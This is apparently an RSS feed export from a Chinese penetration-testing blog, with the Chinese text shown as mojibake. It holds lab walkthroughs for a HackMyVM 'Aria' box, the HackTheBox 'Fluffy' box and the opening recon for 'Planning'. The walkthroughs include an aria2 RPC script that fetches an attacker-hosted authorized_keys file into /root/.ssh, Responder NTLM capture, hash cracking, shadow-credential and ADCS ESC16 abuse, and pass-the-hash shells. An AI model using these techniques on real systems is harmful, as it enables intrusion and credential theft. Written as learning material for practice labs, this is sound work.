- **`E2 80 8B`**: è¿™æ˜¯ UTF-8 ç¼–ç ä¸‹çš„Â **é›¶å®½ç©ºæ ¼ (Zero-Width Space, ZWSP)**ã€‚å®ƒæ˜¯ä¸€ä¸ªåœ¨æ’ç‰ˆä¸­ç”¨äºåœ¨ä¸æ–­è¯çš„åœ°æ–¹å…è®¸æ¢è¡Œçš„å­—ç¬¦ï¼Œä½†å®ƒæœ¬èº«**å®Œå…¨ä¸å¯è§**ï¼Œä¹Ÿä¸å æ®ä»»ä½•å®½åº¦ã€‚
- **`E2 80 8C`**: è¿™æ˜¯ UTF-8 ç¼–ç ä¸‹çš„Â **é›¶å®½éè¿æ¥ç¬¦ (Zero-Width Non-Joiner, ZWNJ)**ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ª**å®Œå…¨ä¸å¯è§**çš„æ§åˆ¶å­—ç¬¦ã€‚

è¿™åº”è¯¥æ˜¯é›¶å®½åº¦å­—èŠ‚éšå†™ï¼Œé€šè¿‡åœ¨çº¿å·¥å…·è¿›è¡Œè§£å¯†ï¼Œé€šè¿‡æœç´¢å¼•æ“æœç´¢ï¼šZero-Width Space Steganography èƒ½æ‰¾åˆ°å¯ç”¨çš„åœ¨çº¿å·¥å…·ï¼Œå°è¯•äº†å¾ˆå¤šä¸ªï¼Œæœ€åè¿™ä¸ªèƒ½ç”¨

> https://stegzero.com/
> 

![image.png](/post-images/HackMyVMAria/image6.png)

å¾—åˆ° `token: maze-sec`

### Aria2 PRC - 2

åœ¨æ–‡æ¡£ä¸­èƒ½çœ‹åˆ°ä¸Šä¼ çš„äº†ä¾‹å­ï¼Œæˆ‘ä»¬è®© AI è¿›è¡Œä¿®æ”¹ä¸€ä¸‹ï¼Œä¸Šä¼ å…¬é’¥æ–‡ä»¶

```bash
#!/usr/bin/python2
# -*- coding: utf-8 -*-

import urllib2
import json

# 1. Your attacker machine's IP address and web server port
attacker_ip = "192.168.56.5" 
attacker_port = 8080

# 2. The URL to your malicious authorized_keys file
payload_url = "http://{}:{}/authorized_keys".format(attacker_ip, attacker_port)

# 3. The secret token for the aria2 RPC interface
rpc_token = "maze-sec"

# 4. Build the aria2 JSON-RPC request
jsonreq = json.dumps({
    'jsonrpc': '2.0',
    'id': 'qwer',
    'method': 'aria2.addUri',
    'params': [
        "token:{}".format(rpc_token),  # <-- THIS IS THE CRUCIAL ADDITION
        [payload_url],                 # The URL list is now the second parameter
        {                              # The options object is now the third
            'dir': '/root/.ssh',
            'out': 'authorized_keys'
        }
    ]
})

print "Sending payload with token to aria2..."

# 5. Send the request
try:
    c = urllib2.urlopen('http://192.168.56.116:6801/jsonrpc', jsonreq)
    print "Payload sent successfully!"
    print "Server response:", c.read()
    print "\nCheck your web server logs to see if the file was downloaded."
    print "If successful, you should now be able to SSH as root."
except urllib2.HTTPError as e:
    print "HTTP Error:", e.code
    print "Response body:", e.read()
except Exception as e:
    print "An error occurred:", e
```

ä¿®æ”¹è„šæœ¬åè¿è¡Œè„šæœ¬ï¼Œä¸Šä¼ æˆåŠŸ

![image.png](/post-images/HackMyVMAria/image7.png)

é€šè¿‡ç§é’¥è¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•

![image.png](/post-images/HackMyVMAria/image8.png)

è¯»å– `root.txt`

```bash
root@Aria:~# cat root.txt 
flag{root-374495cbd5d79b6e45b7778cbac070cc}
```

## æ€»ç»“

Medium ï¼Ÿ]]></content:encoded>
            <category>é¶æœº</category>
            <category>HMV</category>
            <category>Aria2</category>
            <category>Zero-Width</category>
            <category>Space</category>
            <category>Steganography</category>
            <category>Brute</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Fluffy]]></title>
            <link>https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy</guid>
            <pubDate>Sun, 25 May 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Season8 Fluffy https://app.hackthebox.com/machines/Fluffy | Windows Â· Easy Machine Informationï¼šAs is common in real life Windows pentests, you will st...]]></description>
            <content:encoded><![CDATA[
# Season8 - Fluffy

> https://app.hackthebox.com/machines/Fluffy | `Windows` Â· `Easy`
> 

**Machine Informationï¼š**As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

## å‰æœŸè¸©ç‚¹

```bash
âœ nmap -sT -min-rate 5000 -p- 10.10.11.69       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:53 EDT
Nmap scan report for 10.10.11.69
Host is up (0.15s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49695/tcp open  unknown
49701/tcp open  unknown
```

è¿™æ¬¡çš„é¶æœºä¾æ—§æ˜¯æ²¡æœ‰`Web` 

```bash
âœ nmap -sT -A -T4 -O -p 53,139,445 10.10.11.69                                                                                                                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:59 EDT
Nmap scan report for 10.10.11.69
Host is up (0.16s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-25T11:38:32
|_  start_date: N/A
|_clock-skew: 6h38m59s

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   183.42 ms 10.10.16.1
2   183.81 ms 10.10.11.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.00 seconds

```

## ä¿¡æ¯æ”¶é›†

### SMB

æµ‹è¯•å‡­æ®

```bash
âœ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
```

æšä¸¾ç”¨æˆ·

```bash
âœ  nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print $2}' | awk '{print $1}' 
Guest
krbtgt
DC01$
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```

`SMB` ä¿¡æ¯æ”¶é›†

```bash
âœ smbclient -L 10.10.11.69 -U fluffy.htb/j.fleischman%J0elTHEM4n1990!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
âœ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 25 08:21:54 2025
  ..                                  D        0  Sun May 25 08:21:54 2025
  0x5chltz.library-ms                 A      364  Sun May 25 08:13:39 2025
  1.lnk                               A     2164  Sun May 25 07:59:46 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A      317  Sun May 25 08:06:27 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A      317  Sun May 25 08:06:16 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1849449 blocks available
```

 `Upgrade_Notice.pdf` åƒæ˜¯æ¸—é€æµ‹è¯•æŠ¥å‘Šä¸€æ ·çš„ä¸œè¥¿

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image.png)

ä¸‹è¾¹æœ‰æŠ«éœ²çš„å…¬å¼€æ¼æ´

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image1.png)

èƒ½çœ‹åˆ°æœ‰ä¸¤ä¸ª `Critical` æ¼æ´ä»¥åŠä¸¤ä¸ª `High` æ¼æ´

### CVE-2025-24071

å¯¹æ¯”äº†ä¸¤ä¸ªæ¼æ´ `CVE-2025-24996` å’Œ `CVE-2025-24071`

å…¶ä¸­ `CVE-2025-24996` ç½‘ä¸Šæ–‡ç« å¹¶ä¸å¤šï¼Œè€Œ `CVE-2025-24071` ä¼šæœ‰å¤ç°æ–‡ç« ï¼Œæ‰€ä»¥ä¾§é‡äº `CVE-2025-24071`

å¤ç°æ–‡ç« ï¼šhttps://blog.csdn.net/weixin_42773448/article/details/146436061

å·¥å…·ï¼šhttps://github.com/0x6rss/CVE-2025-24071_PoC

```bash
âœ  CVE-2025-24071_PoC git:(main) python poc.py 
Enter your file name: doc
Enter IP (EX: 192.168.1.162): 10.10.16.16
completed
```

ä¸Šä¼ åˆ° `IT`

```bash
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.8 kb/s) (average 0.8 kb/s)
```

åŒæ—¶å¼€å¯`responder`ç›‘å¬

```bash
âœ responder -I tun0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
```

ç­‰ä¸€ä¼šèƒ½å°±æ¥æ”¶åˆ° `p.agila` ç”¨æˆ· `NET NTLM hash`

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image2.png)

```bash
p.agila::FLUFFY:56ab772ca1eae1e3:E1A831FDA20AA227AD2187ABCD5C3737:01010000000000008003A3D819CDDB010A2E54C0A8C85EC30000000002000800330037003200460001001E00570049004E002D0059005000570030004F00330051004D0053004500480004003400570049004E002D0059005000570030004F00330051004D005300450048002E0033003700320046002E004C004F00430041004C000300140033003700320046002E004C004F00430041004C000500140033003700320046002E004C004F00430041004C00070008008003A3D819CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000  
```

ä½¿ç”¨ `hashcat` è¿›è¡Œç ´è§£ç”¨æˆ·å‡­æ®

```bash
âœ hashcat -m 5600 'xxxx' /usr/share/wordlists/rockyou.txt 
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image3.png)

å¾—åˆ°å¯†ç  `prometheusx-303` 

æµ‹è¯•å‡­æ®

```bash
âœ crackmapexec smb 10.10.11.69 -u p.agila -p prometheusx-303
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
```

### BloodHound

è¿™é‡Œä½¿ç”¨ `BloodHound` è¿›è¡Œæšä¸¾åŸŸæ”»å‡»è·¯çº¿

```bash
ntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC.fluffy.htb
```

```bash
âœ ntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC01.fluffy.htb
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 24S
INFO: Compressing output into 20250525091352_bloodhound.zip
```

ç”¨æˆ· `p.agila` å±äº `SERVICE ACCOUNT MANGERS` å’Œ `SERVICE ACCOUNTS` ç»„ï¼Œå…¶ä¸­`SERVICE ACCOUNT MANGERS` å¯¹ `SERVICE ACCOUNTS` ç»„æœ‰ `GenericAll` æƒé™

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image4.png)

ç„¶åè¿œç¨‹æœåŠ¡ç”¨æˆ· `WINRM_SVC` ç­‰ä¹Ÿæ˜¯åœ¨ `SERVICE ACCOUNTS` ç»„å†…

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image5.png)

## åŸŸæ¸—é€

### To Winrm_svc

å¯ä»¥ä½¿ç”¨ `GetUserSPNs` è·å–æœåŠ¡ç”¨æˆ· `HASH` æ¥è¿›è¡Œç ´è§£

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image6.png)

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image7.png)

ä½†æ˜¯å¹¶æ— æ³•ç ´è§£æˆåŠŸï¼ŒæœåŠ¡è´¦æˆ·å¯†ç éƒ½æ˜¯éšæœºçš„â€¦

å½±å­ç”¨æˆ·(`Shadow Credential Attack`)å¯åŠ¨

```bash
âœ certipy shadow auto -username "p.agila@fluffy.htb" -p "prometheusx-303" -account WINRM_SVC -dc-ip 10.10.11.69
```

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image8.png)

```bash
âœ export KRB5CCNAME=winrm_svc.ccache 
```

`evil-winrm` ç™»å½•

```bash
âœ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
```

`user.txt`

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
9e23a6ed83a674306f7fad569aa292bb
```

### å¯»æ‰¾æ”»å‡»è·¯çº¿

ç»§ç»­å¯»æ‰¾ææƒè·¯çº¿

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image9.png)

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image10.png)

æ„Ÿè§‰è¿˜æ˜¯è¦æ‹¿ `CA_SVC` ç”¨æˆ·è¿›è¡Œä¸€äº›æ”»å‡»ï¼Œä¾‹å¦‚ `ADCS` æ”»å‡»ï¼Œå› ä¸ºå®ƒæ˜¯ `CA` æœåŠ¡ç”¨æˆ·

ä½¿ç”¨ `certipy` ï¼ˆè¿™é‡Œéœ€è¦å¯¹`certipy`è¿›è¡Œæ›´æ–°ï¼Œåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæ„£æ˜¯æ‰¾ä¸åˆ°æ”»å‡»è·¯å¾„ï¼‰æšä¸¾å¯èƒ½çš„æ¼æ´ä¿¡æ¯

```bash
âœ certipy find -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -vulnerable     
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250525110326_Certipy.txt'
[*] Wrote text output to '20250525110326_Certipy.txt'
[*] Saving JSON output to '20250525110326_Certipy.json'
[*] Wrote JSON output to '20250525110326_Certipy.json'

```

å­˜åœ¨ `ESC16`

![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image11.png)

### ESC16

åˆ©ç”¨é“¾æ¥ï¼šhttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

å½±å­ç”¨æˆ·è·å– `CA_SVC` çš„ `NT hash` 

```bash
âœ certipy shadow auto -username "p.agila@fluffy.htb" -p "prometheusx-303" -account CA_SVC -dc-ip 10.10.11.69
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7f0851e9-35c3-eccb-fd92-b35465aa5f94'
[*] Adding Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

ä¸‹é¢è·Ÿç€åˆ©ç”¨é“¾æ¥çš„åšå³å¯

```bash
âœ certipy account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-25T14:57:02+00:00
```

```bash
âœ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' -user 'ca_svc' update
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'

```

```bash
âœ certipy req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 43
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
âœ ntpdate -s 10.10.11.69 && certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

```bash
âœ certipy auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69                                                                                                   
Certipy v5.0.2 - by Oliver Lyak (ly4k)      
                                                                                                                                                                                                                  
[*] Certificate identities:                                                                                                                                                                                       
[*]     SAN UPN: 'administrator@fluffy.htb'                                                              
[*] Using principal: 'administrator@fluffy.htb'                                                                                                                                                                   
[*] Trying to get TGT...                                                                                                                                                                                          
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache' 
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

```bash
âœ psexec.py fluffy.htb/administrator@10.10.11.69 -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.69.....
[*] Found writable share ADMIN$
[*] Uploading file VJlmOeTb.exe
[*] Opening SVCManager on 10.10.11.69.....
[*] Creating service trya on 10.10.11.69.....
[*] Starting service trya.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6893]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```

```bash
C:\Users\Administrator\Desktop> type root.txt
03337de6b0f0f5188a76c3970006b97b
```

## æ€»ç»“

CVE-2025-24071ï¼ŒADCSï¼ŒESC16ï¼ŒNTLM ä¸­ç»§]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Windows</category>
            <category>ADCS</category>
            <category>ESC16</category>
            <category>Responder</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Planning]]></title>
            <link>https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Planning</guid>
            <pubDate>Sun, 11 May 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Planning https://app.hackthebox.com/machines/Planning | Esay å‰æœŸè¸©ç‚¹ æ”¶é›†åˆ°ä¸€ä¸ªé‚®ç®± info@planning.htb Web æ¸—é€ ä¿¡æ¯æ”¶é›† è®¿é—® HTTP æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹ å¯èƒ½æœ‰ç”¨çš„ä¸‰ä¸ªç”¨æˆ·å Bob Moss Ro...]]></description>
            <content:encoded><![CDATA[
# Machine - Planning

> https://app.hackthebox.com/machines/Planning | `Esay`
> 

## å‰æœŸè¸©ç‚¹

```bash
âœ  Planning nmap -sT -min-rate 10000 -p- 10.10.11.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:56 EDT
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.19s latency).
Not shown: 65269 filtered tcp ports (no-response), 264 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 50.82 seconds
```

```bash
âœ  Planning nmap -sU -min-rate 5000 -p- 10.10.11.68                                                                                                                                                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 01:01 EDT
Warning: 10.10.11.68 giving up on port because retransmission cap hit (10).
Nmap scan report for planning.htb (10.10.11.68)
Host is up (4.5s latency).
All 65535 scanned ports on planning.htb (10.10.11.68) are in ignored states.
Not shown: 65443 open|filtered udp ports (no-response), 92 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 176.18 seconds
```

```bash
âœ  Planning nmap -sT -A -T4 -O -p 22,80 10.10.11.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 00:59 EDT
Nmap scan report for planning.htb (10.10.11.68)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   221.80 ms 10.10.16.1
2   161.43 ms planning.htb (10.10.11.68)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.81 seconds
```

æ”¶é›†åˆ°ä¸€ä¸ªé‚®ç®± `info@planning.htb`

```bash
âœ  Planning whatweb planning.htb
http://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]
```

## Web æ¸—é€

### ä¿¡æ¯æ”¶é›†

è®¿é—® `HTTP` æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image.png)

å¯èƒ½æœ‰ç”¨çš„ä¸‰ä¸ªç”¨æˆ·å `Bob Moss` `Rose Mary` `Stella Haks`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image1.png)

`Detail.php` é¡µé¢å¯ä»¥æ³¨å†Œï¼Œä½†æ˜¯è²Œä¼¼æ²¡ä»€ä¹ˆç”¨

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image2.png)

ç›®å½•æ‰«æ

```bash
âœ  Planning dirsearch -u http://planning.htb -x 404,429 -e php,zip,txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/test/Planning/reports/http_planning.htb/_25-05-11_01-14-34.txt

Target: http://planning.htb/

[01:14:34] Starting: 
[01:14:51] 200 -   12KB - /about.php
[01:15:12] 200 -   10KB - /contact.php
[01:15:13] 301 -  178B  - /css  ->  http://planning.htb/css/
[01:15:24] 301 -  178B  - /img  ->  http://planning.htb/img/
[01:15:27] 301 -  178B  - /js  ->  http://planning.htb/js/
[01:15:27] 403 -  564B  - /js/
[01:15:29] 301 -  178B  - /lib  ->  http://planning.htb/lib/
[01:15:29] 403 -  564B  - /lib/
```

çˆ†ç ´ä¸€ä¸‹å­åŸŸå

```bash
âœ  Planning wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H 'Host:FUZZ.planning.htb'                                                                               
********************************************************                                                                                                                                                                            
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                                                                            
********************************************************                                                                                                                                                                            
                                                                                                                                                                                                                                    
Target: http://planning.htb/                                                                                                                                                                                                        
Total requests: 100000                                                                                                                                                                                                              
                                                                                                                                                                                                                                    
=====================================================================                                                                                                                                                               
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================    
000024093:   302        2 L      2 W        29 Ch       "grafana"    
```

èƒ½æ‰¾åˆ°å« `grafana` çš„å­åŸŸåï¼Œæ·»åŠ åˆ° `hosts` æ–‡ä»¶

è®¿é—®ä¸€ä¸‹ï¼Œç‰ˆæœ¬æ˜¯ `Grafana v11.0.0 (83b9528bce)`

![image.png](/post-images/HackTheBoxMachine%20-%20Planning/image3.png)

### Grafana

> Grafana æ˜¯ä¸€ä¸ªå¼€æºçš„åº¦é‡åˆ†æå’Œå¯è§†åŒ–å·¥å…·ï¼Œæ”¯æŒå¤šç§æ•°æ®æºå¦‚ Graphiteã€InfluxDB ç­‰ã€‚å®‰è£…å®Œæˆåï¼ŒGrafana çš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯***admin***
> 

å°è¯•ä¸‹é»˜è®¤å¯†ç ï¼Œæ˜¯å¤±è´¥çš„

æ‰¾ä¸€ä¸‹ç‰ˆæœ¬ç›¸å…³æ¼æ´

